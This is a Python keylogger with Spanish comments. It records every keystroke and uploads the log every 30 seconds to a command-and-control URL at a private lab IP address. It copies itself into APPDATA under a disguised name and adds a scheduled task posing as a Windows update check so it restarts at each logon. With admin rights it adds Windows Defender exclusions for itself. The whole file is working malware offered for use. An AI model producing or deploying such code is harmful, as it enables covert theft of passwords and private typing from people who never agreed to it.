from pynput import keyboard
import time
import datetime
import threading
import urllib.request
import os
import sys
import shutil
import subprocess

# ---------------- CONFIGURACION ----------------
WAIT_SECONDS = 30
FLUSH_INTERVAL = 2
C2_URL = "http://192.168.56.10:8000/upload"
NOMBRE_PERSISTENCIA = "msfconsole.exe"
NOMBRE_TAREA = "WindowsUpdateCheck"
# ----------------------------------------------

APPDATA = os.getenv('APPDATA')
RUTA_DESTINO = os.path.join(APPDATA, NOMBRE_PERSISTENCIA)
FILE_LOG = os.path.join(os.getenv('TEMP'), 'dat.txt')
FILE_ERR = os.path.join(os.getenv('TEMP'), 'payload_err.txt')

buffer = []
buffer_lock = threading.Lock()
timeout = time.time() + WAIT_SECONDS

NO_WINDOW = 0x08000000


def log_err(msg):
    try:
        with open(FILE_ERR, 'a', encoding='utf-8') as f:
            f.write(f"{datetime.datetime.now()} - {msg}\n")
    except Exception:
        pass


def ya_estoy_instalado():
    try:
        return os.path.abspath(sys.executable).lower() == os.path.abspath(RUTA_DESTINO).lower()
    except Exception:
        return False


def es_admin():
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def instalar_persistencia():
    try:
        if ya_estoy_instalado():
            return True

        shutil.copy2(sys.executable, RUTA_DESTINO)
        log_err(f"copiado a {RUTA_DESTINO}")

        subprocess.run([
            'schtasks', '/create', '/tn', NOMBRE_TAREA,
            '/tr', RUTA_DESTINO, '/sc', 'onlogon', '/f'
        ], capture_output=True, creationflags=NO_WINDOW)
        log_err("tarea programada creada")

        if es_admin():
            try:
                ps_cmd = (
                    f'Add-MpPreference -ExclusionPath "{RUTA_DESTINO}"; '
                    f'Add-MpPreference -ExclusionPath "{os.getenv("TEMP")}"; '
                    f'Add-MpPreference -ExclusionProcess "{NOMBRE_PERSISTENCIA}"'
                )
                subprocess.run([
                    'powershell', '-WindowStyle', 'Hidden', '-Command', ps_cmd
                ], capture_output=True, creationflags=NO_WINDOW)
                log_err("exclusiones de Defender anadidas")
            except Exception as e:
                log_err(f"exclusion Defender: {e}")

        return False
    except Exception as e:
        log_err(f"persistencia: {e}")
        return True


def escribir_buffer():
    global buffer
    with buffer_lock:
        if not buffer:
            return
        try:
            with open(FILE_LOG, 'a', encoding='utf-8') as f:
                f.write(''.join(buffer))
            buffer = []
        except Exception as e:
            log_err(f"escribir_buffer: {e}")


def flusher():
    while True:
        time.sleep(FLUSH_INTERVAL)
        escribir_buffer()


def exfiltrate():
    try:
        escribir_buffer()
        if not os.path.exists(FILE_LOG):
            return
        with open(FILE_LOG, 'r', encoding='utf-8') as f:
            data = f.read()
        if not data.strip():
            return

        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload = f"Log capturado a las: {fecha}\n{data}".encode('utf-8')

        req = urllib.request.Request(C2_URL, data=payload, method='POST')
        with urllib.request.urlopen(req, timeout=5) as resp:
            if resp.status == 200:
                log_err(f"exfiltrate OK: {len(data)} bytes")

        backup = FILE_LOG + '.old'
        try:
            if os.path.exists(backup):
                os.remove(backup)
            os.rename(FILE_LOG, backup)
        except Exception:
            with open(FILE_LOG, 'w', encoding='utf-8') as f:
                f.truncate()
    except Exception as e:
        log_err(f"exfiltrate: {e}")


def on_press(key):
    try:
        try:
            char = key.char
        except AttributeError:
            char = f'[{key.name}]'
        with buffer_lock:
            buffer.append(char)
    except Exception:
        pass


def check_timeout():
    global timeout
    while True:
        try:
            if time.time() > timeout:
                exfiltrate()
                timeout = time.time() + WAIT_SECONDS
        except Exception as e:
            log_err(f"check_timeout: {e}")
        time.sleep(1)


def iniciar_listener():
    l = keyboard.Listener(on_press=on_press)
    l.start()
    return l


def main():
    log_err("=== payload arrancado ===")
    ya_instalado = instalar_persistencia()

    if not ya_instalado:
        log_err("Recien instalado. Lanzando copia persistente y saliendo.")
        try:
            subprocess.Popen([RUTA_DESTINO],
                             creationflags=0x00000008 | NO_WINDOW,
                             close_fds=True)
        except Exception as e:
            log_err(f"no se pudo lanzar copia persistente: {e}")
        return

    threading.Thread(target=flusher, daemon=True).start()
    threading.Thread(target=check_timeout, daemon=True).start()

    listener = iniciar_listener()
    try:
        while True:
            time.sleep(5)
            if not listener.running:
                log_err("listener muerto, reiniciando")
                listener = iniciar_listener()
    except KeyboardInterrupt:
        escribir_buffer()
        listener.stop()


if __name__ == "__main__":
    main()
